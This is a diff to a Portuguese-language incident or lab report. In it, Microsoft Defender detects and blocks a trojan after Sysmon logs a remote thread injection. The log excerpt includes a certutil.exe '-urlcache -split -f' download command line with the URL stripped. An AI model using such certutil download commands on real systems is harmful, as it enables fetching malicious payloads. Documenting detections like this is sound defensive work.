@@ -309,19 +309,23 @@ Esse tipo de evento é típico de malwares que tentam executar código em outro 
 ![Image](https://github.com/user-attachments/assets/ea9fae2a-8fe5-4ef5-aea2-cf221346e740)
 Pouco após a tentativa de injeção de thread remota registrada pelo Sysmon (Event ID 8), o processo SecurityHealthHost.exe, parte do Windows Defender, foi invocado. Isso sugere que a carga maliciosa foi identificada e bloqueada pela solução nativa do sistema, interrompendo a execução completa do ataque.
 
-3.[CCONFIRMACAO DO BLOQUEIO NO WINDOWS DEFENDER LOGS]
+3. [IDENTIFICACAO PELO SISTEMA DE DEFESA]
+![Image](https://github.com/user-attachments/assets/e1290956-49f1-473f-90bc-caf32dd7de12)
 
-```🔍 Detecção pelo Microsoft Defender:
-
+```
 Threat Name:      Trojan:Win32/Ceprolad.A  
 Severity:         Severe  
 Detection Time:   2025-05-27 20:29:56 UTC  
 Detected By:      NT AUTHORITY\SYSTEM  
 Process Name:     certutil.exe  
-Command Line:     certutil.exe -urlcache -split -f https://[URL_REDACTED]  
+Command Line:     certutil.exe -urlcache -split -f https://  
 Path:             C:\Windows\System32\certutil.exe  
-Action Taken:     Not Applicable (bloqueio automático durante o download)  
+Action Taken:     Not Applicable 
 ```
+
+3.[CCONFIRMACAO DO BLOQUEIO PELO SISTEMA DE DEFESA]
+![Image](https://github.com/user-attachments/assets/c427e929-77b8-4468-bb63-cbeb4c7bad3f)
+
 
 
 ##CONCLUSAO 
